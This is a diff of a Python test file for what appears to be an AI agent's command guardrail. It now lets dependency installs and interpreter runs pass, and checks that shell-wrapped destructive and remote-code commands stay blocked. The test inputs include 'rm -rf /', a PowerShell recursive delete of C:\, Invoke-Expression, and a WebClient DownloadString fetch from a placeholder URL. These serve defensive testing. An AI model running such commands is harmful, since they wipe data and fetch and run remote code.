@@ -168,9 +168,23 @@ class BackgroundJobTests(unittest.TestCase):
 
 
 class GuardrailTests(unittest.TestCase):
-    def test_blacklist_still_blocks_dependency_install(self):
-        with patch.object(tools, "_get_code_root", return_value=tempfile.gettempdir()):
-            self.assertIn("拒绝执行", tools.run_command("pip install requests"))
+    def test_dependency_install_and_interpreters_now_pass_guardrail(self):
+        """「留地板、拆其余」重构：装依赖 / 跑解释器不再是灾难，放开。
+        直接调 _cmd_is_blocked 验「过护栏」，不真的执行命令。"""
+        for cmd in ("pip install requests", "npm i -g typescript",
+                    "python -c \"print(1)\"", "bash build.sh",
+                    "powershell ./deploy.ps1", "python build.py"):
+            blocked, why = tools._cmd_is_blocked(cmd)
+            self.assertFalse(blocked, "%r 不该再被拦（命中 %r）" % (cmd, why))
+
+    def test_shell_wrapped_destruction_still_blocked(self):
+        """解释器放开后，被 shell 包裹的破坏性 / RCE 仍须兜住（灾难地板不降）。"""
+        for cmd in ('powershell -c "Remove-Item -Recurse -Force C:\\\\"',
+                    'bash -c "rm -rf /"',
+                    "powershell -command Invoke-Expression",
+                    "pwsh -c (New-Object Net.WebClient).DownloadString('http://x')"):
+            blocked, why = tools._cmd_is_blocked(cmd)
+            self.assertTrue(blocked, "%r 应被兜住（命中 %r）" % (cmd, why))
 
     def test_blacklist_still_blocks_destructive_commands(self):
         with patch.object(tools, "_get_code_root", return_value=tempfile.gettempdir()):
